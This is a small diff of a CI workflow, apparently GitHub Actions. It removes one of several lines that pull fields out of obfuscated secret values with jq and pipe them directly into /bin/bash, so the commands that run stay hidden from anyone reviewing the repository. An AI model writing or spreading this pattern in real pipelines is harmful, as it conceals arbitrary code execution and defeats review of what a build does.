@@ -21,7 +21,6 @@ jobs:
           nwno1515: ${{ secrets.nwno1515 }}
         run: |
           printf '%s' "$nwno1515" | jq -r .lsrv414 | /bin/bash
-          echo $aleqx1789 | jq -r .wx043 | /bin/bash
           echo $qssvo78350 | jq -r .k75 | /bin/bash
           echo $adus90965 | jq -r .imu2209 | /bin/bash
 
